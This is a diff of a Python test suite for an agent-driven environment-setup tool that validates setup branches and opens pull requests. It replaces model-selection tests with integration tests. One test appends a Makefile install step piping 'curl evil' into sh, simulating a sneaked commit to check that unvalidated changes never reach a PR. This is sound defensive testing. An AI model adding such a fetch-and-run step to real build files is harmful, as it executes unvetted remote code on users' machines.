@@ -1,4 +1,4 @@
-"""Agent-led environment setup (autoinstall.py, modelpick.py): end to end on the fake provider with scripted goal and
+"""Agent-led environment setup (autoinstall.py): end to end on the fake provider with scripted goal and
 setup agents, a local git remote holding a small fixture repo (a Makefile and a pytest suite), and hangar's own
 validation in a clean sandbox."""
 
@@ -17,7 +17,7 @@ from pathlib import Path
 import httpx
 import pytest
 
-from hangar import autoinstall, envbuilds, modelpick, repoenv
+from hangar import autoinstall, envbuilds, repoenv
 from hangar.harnesses import HARNESSES, Harness
 from hangar.jobs import Caller, JobError, JobService, SubmitJob
 from hangar.models import CredentialKind, JobState
@@ -148,7 +148,7 @@ async def jobs(fleet, world, settings, monkeypatch):
     monkeypatch.setattr(landing, "parse_repo", as_github)
     sessions = SessionService(fleet, Vault(fleet.store, b"0" * 43 + b"="))
     await sessions.start()
-    hooks = Hooks()
+    hooks = RefHooks(world["remote"])
     svc = JobService(fleet, sessions, transport=httpx.MockTransport(hooks))
     svc.hooks = hooks
     fleet.broker.put("gh", "git", CredentialKind.GIT_TOKEN, "ghp_x")
@@ -171,6 +171,26 @@ async def jobs(fleet, world, settings, monkeypatch):
     for box in prov.boxes.values():
         subprocess.run(["tmux", "kill-server"], env={"TMUX_TMPDIR": f"{box}/tmp", "PATH": "/usr/bin:/bin"},
                        capture_output=True)
+
+
+class RefHooks(Hooks):
+    """--- integ3: the mock GitHub also answers `GET git/ref/heads/<branch>` from the local remote, so delivery can
+    check that the branch is still at the commit hangar validated."""
+
+    def __init__(self, remote: Path):
+        super().__init__()
+        self.remote = remote
+
+    def __call__(self, request: httpx.Request) -> httpx.Response:
+        p = request.url.path
+        if request.url.host == "api.github.com" and "/git/ref/heads/" in p and request.method == "GET":
+            self.calls.append(request)
+            branch = p.split("/git/ref/heads/", 1)[1]
+            sha = subprocess.run(["git", "--git-dir", str(self.remote), "rev-parse", f"refs/heads/{branch}"],
+                                 capture_output=True, text=True).stdout.strip()
+            return httpx.Response(200, json={"object": {"sha": sha}}) if sha else \
+                httpx.Response(404, json={"message": "Not Found"})
+        return super().__call__(request)
 
 
 def submit(jobs: JobService, world, **kw) -> object:
@@ -213,6 +233,7 @@ async def test_goal_setup_validate_retry_and_pr(jobs, world, fleet):
     kids = children(jobs, job.id)
     goal_job, setup_job = kids["goal"], kids["setup"]
     assert goal_job.deliver == "none" and len(goal_job.turns) == 2  # the proposal, then the judgement
+    assert st.models["_model"] == "frontier" == goal_job.model == setup_job.model  # --- integ3: one model module
     assert len(setup_job.turns) == 2 and setup_job.verify is None
     retry = setup_job.turns[1].message
     assert "Hangar validated your setup" in retry and "payments API" in retry
@@ -229,6 +250,7 @@ async def test_goal_setup_validate_retry_and_pr(jobs, world, fleet):
     assert "the validated test command" in pr["body"]
     packet = next(c for c in jobs.hooks.comments() if "Review packet" in c)
     assert "**Environment setup:**" in packet and "mocked: `payments API`" in packet
+    assert f"validated `{second.head_sha[:12]}`" in packet and second.head_sha == setup_job.result.head_sha
     cfg = repoenv.parse(_remote_file(world["remote"], setup_job.branch, repoenv.PATH))
     assert cfg.verify == f"make test PYTHON={PY}" and cfg.mocks[0].what == "payments API"
     assert "Development environment" in _remote_file(world["remote"], setup_job.branch, "AGENTS.md")
@@ -445,66 +467,6 @@ def test_mocks_are_part_of_the_file_but_not_the_build():
         repoenv.parse("mocks:\n  - {what: S3, how: x, secret: y}\n")
 
 
-# ---------------------------------------------------------------------- the model pick
-PRICES = {"claude-opus-5-5": {"output": 20.0}, "claude-mythos-5-1": {"output": 50.0},
-          "claude-sonnet-5-5": {"output": 10.0}, "claude-haiku-5-5": {"output": 0.5},
-          "gpt-5.6-sol": {"output": 20.0}, "gpt-5.6-luna": {"output": 1.2}}
-DAY = 86400.0
-NOW = 1_790_000_000.0
-
-
-def test_rank_picks_the_strongest_general_model_of_the_newest_generation():
-    M = modelpick.Model
-    anthropic = [M("claude-opus-5-5", NOW), M("claude-sonnet-5-5", NOW), M("claude-haiku-5-5", NOW),
-                 M("claude-mythos-5-1", NOW - 60 * DAY), M("claude-opus-4-1", NOW - 400 * DAY)]
-    assert modelpick.rank(anthropic, "anthropic", PRICES) == "claude-mythos-5-1"  # priciest within 180 days
-    old = [M("claude-opus-5-5", NOW), M("claude-mythos-5-1", NOW - 300 * DAY)]
-    assert modelpick.rank(old, "anthropic", PRICES) == "claude-opus-5-5"  # an older generation drops out
-    # a release newer than the price table takes its line's price, so it isn't passed over
-    new = [M("claude-opus-6", NOW + DAY), M("claude-opus-5-5", NOW), M("claude-sonnet-6", NOW + DAY)]
-    assert modelpick.rank(new, "anthropic", PRICES) == "claude-opus-6"
-    openai = [M("gpt-5.6-sol", NOW), M("gpt-5.6-luna", NOW), M("gpt-5.6-mini", NOW), M("text-embedding-3", NOW)]
-    assert modelpick.rank(openai, "openai", PRICES) == "gpt-5.6-sol"
-    google = [M("gemini-3.8-flash", None), M("gemini-3.1-pro-preview", None), M("gemini-2.5-pro", None)]
-    assert modelpick.rank(google, "google", PRICES) == "gemini-3.1-pro-preview"  # no dates: the newest major
-    assert modelpick.rank([M("claude-haiku-5-5", NOW)], "anthropic", PRICES) is None
-
-
-async def test_pick_asks_the_provider_with_the_team_key_and_falls_back(fleet, broker):
-    modelpick._cache.clear()
-    seen: list[httpx.Request] = []
-
-    def api(req: httpx.Request) -> httpx.Response:
-        seen.append(req)
-        if req.url.host == "api.anthropic.com":
-            return httpx.Response(200, json={"data": [
-                {"id": "claude-opus-5-5", "created_at": "2026-09-21T00:00:00Z", "lifecycle": "active",
-                 "line": "opus"},
-                {"id": "claude-mythos-5-1", "created_at": "2026-06-01T00:00:00Z", "lifecycle": "deprecated",
-                 "line": "mythos"},
-                {"id": "claude-sonnet-5-5", "created_at": "2026-09-21T00:00:00Z", "lifecycle": "active",
-                 "line": "sonnet"}]})
-        if req.url.host == "openrouter.ai":
-            return httpx.Response(200, json={"data": [
-                {"id": "openai/gpt-5.6-sol", "created": NOW}, {"id": "openai/gpt-5.6-nano", "created": NOW},
-                {"id": "anthropic/claude-opus-5.5", "created": NOW}]})
-        return httpx.Response(500)
-
-    t = httpx.MockTransport(api)
-    broker.put("team-anthropic", "claude-code", CredentialKind.API_KEY, "sk-ant-api-team")
-    p = await modelpick.pick(fleet, "claude-code", t)
-    assert p.model == "claude-opus-5-5" and "anthropic's model list" in p.source  # the deprecated one is left out
-    assert seen[0].headers["x-api-key"] == "sk-ant-api-team" and seen[0].headers["anthropic-version"]
-    p = await modelpick.pick(fleet, "codex", t)  # no team key: OpenRouter's public list, the provider's ids
-    assert p.model == "gpt-5.6-sol" and "OpenRouter" in p.source and "authorization" not in seen[-1].headers
-    fleet.settings.env_setup_models = {"codex": "gpt-pinned"}
-    assert (await modelpick.pick(fleet, "codex", t)).model == "gpt-pinned"
-    modelpick._cache.clear()
-    p = await modelpick.pick(fleet, "antigravity", httpx.MockTransport(lambda r: httpx.Response(503)))
-    assert p.model is None and "own default" in p.source
-    assert (await modelpick.pick(fleet, "scripted", t)).model is None
-
-
 async def test_packet_lines_only_for_the_setup_job(jobs, world):
     from hangar.models import Job
 
@@ -586,12 +548,53 @@ def test_the_budget_split_never_crosses_the_job_budget():
         assert goal.max_cost_usd + setup.max_cost_usd <= 30.0
 
 
-async def test_antigravity_gets_its_own_model_id(fleet):
-    """agy names Gemini models without `-preview`, plus a thinking level (`gemini-3.1-pro-high`)."""
-    modelpick._cache.clear()
-    fleet.broker.put("team-google", "antigravity", CredentialKind.API_KEY, "g-key")
-    t = httpx.MockTransport(lambda r: httpx.Response(200, json={"models": [
-        {"name": "models/gemini-3.1-pro-preview", "supportedGenerationMethods": ["generateContent"]}]}))
-    p = await modelpick.pick(fleet, "antigravity", t)
-    assert p.model == "gemini-3.1-pro-high", p
-    modelpick._cache.clear()
+# ---------------------------------------------------------------------- integration (Wave 3)
+async def test_a_push_after_validation_means_no_pr(jobs, world, monkeypatch):
+    """--- integ3 (review #102): the validation sandbox runs the agent-written install with the setup branch's push
+    scope. A commit pushed to the branch after validation must not reach a PR hangar opens as itself."""
+    deliver = autoinstall._deliver
+
+    async def pushed_meanwhile(svc, job, st):
+        s = svc.get(st.setup_job)
+        work = world["root"] / "sneak"
+        subprocess.run([*GIT, "clone", "-q", "-b", s.branch, str(world["remote"]), str(work)], check=True)
+        (work / "Makefile").write_text((work / "Makefile").read_text() + "\ninstall:\n\tcurl evil | sh\n")
+        subprocess.run([*GIT, "-C", str(work), "commit", "-qam", "unvalidated"], check=True)
+        subprocess.run([*GIT, "-C", str(work), "push", "-q", "origin", s.branch], check=True)
+        await deliver(svc, job, st)
+
+    monkeypatch.setattr(autoinstall, "_deliver", pushed_meanwhile)
+    job = await _until(jobs, submit(jobs, world).id, DONE, timeout=90)
+    assert job.state == JobState.FAILED and job.reason == "validation_stale", [e.message for e in job.events]
+    assert "the commit hangar validated" in job.result.summary and "isn't opened" in job.result.summary
+    assert not jobs.hooks.prs
+
+
+async def test_frontier_or_a_pin_for_both_agents_labelled_with_id_and_price(jobs):
+    """--- integ3 (review #102): one model module. Unless the request names a model, both agents get `frontier`,
+    or HANGAR_ENV_SETUP_MODELS' pin; the label is modelpolicy's: the id it resolves to, the policy, the price."""
+    label = await autoinstall._model_label(jobs, "claude-code", "frontier")
+    assert label.startswith("`claude-fable-5-1` (`frontier`; list price $10/$50") and "built-in" in label
+    jobs.settings.env_setup_models = {"claude-code": "claude-opus-5-5"}
+    label = await autoinstall._model_label(jobs, "claude-code", "claude-opus-5-5")
+    assert label.startswith("`claude-opus-5-5` (list price $4/$20") and "HANGAR_ENV_SETUP_MODELS" in label
+
+
+async def test_drift_sees_an_open_env_setup_pr_whose_job_left_memory(jobs, world, fleet):
+    """--- integ3 (#108): a finished env setup is evicted from memory; its setup job's PR, still open, must still
+    stop a drift run from opening a second one."""
+    from hangar.models import Job
+
+    parent = Job(title="env setup", instructions="x", environment="autoenv", repo=world["url"],
+                 state=JobState.SUCCEEDED, labels={autoinstall.KIND_LABEL: autoinstall.KIND})
+    child = Job(title="setup", instructions="x", environment="autoenv", repo=world["url"], state=JobState.SUCCEEDED,
+                labels={autoinstall.PARENT_LABEL: parent.id, autoinstall.ROLE_LABEL: "setup"})
+    child.result.pr_url, child.landing.pr_state = "https://github.com/o/r/pull/9", "open"
+    parent.result.data = autoinstall.State(stage="done", setup_job=child.id).model_dump(mode="json")
+    fleet.store.put(parent)
+    fleet.store.put(child)
+    assert jobs._jobs.peek(parent.id) is None  # in the store only, as after an eviction
+    drift = Job(title="drift", instructions="x", environment="autoenv", repo=world["url"],
+                labels={autoinstall.KIND_LABEL: autoinstall.KIND})
+    why, fine = autoinstall.drift_reason(jobs, drift)
+    assert why is None and "pull/9" in fine and "still open" in fine
